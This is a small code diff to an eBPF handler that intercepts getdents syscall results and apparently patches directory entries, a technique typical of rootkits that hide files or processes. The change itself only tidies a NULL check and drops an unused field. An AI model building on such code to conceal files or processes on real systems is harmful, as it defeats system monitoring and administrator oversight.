@@ -21,7 +21,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
    u64 * dirents_buf = get_dirent_buf(&pid);
    struct userspace_data * userspace_data = get_userspace_data();
 
-   if (dirents_buf == NULL || userspace_data == NULL) return 0;
+   if (!dirents_buf || !userspace_data) return 0;
 
    struct dirents_data_t dirents_data = {
       .bpos = 0,
@@ -30,7 +30,6 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
       .buff_size = ctx->ret,
       .d_reclen = 0,
       .d_reclen_prev = 0,
-      .d_reclen_new = 0,
       .patch_succeded = false,
    };
 
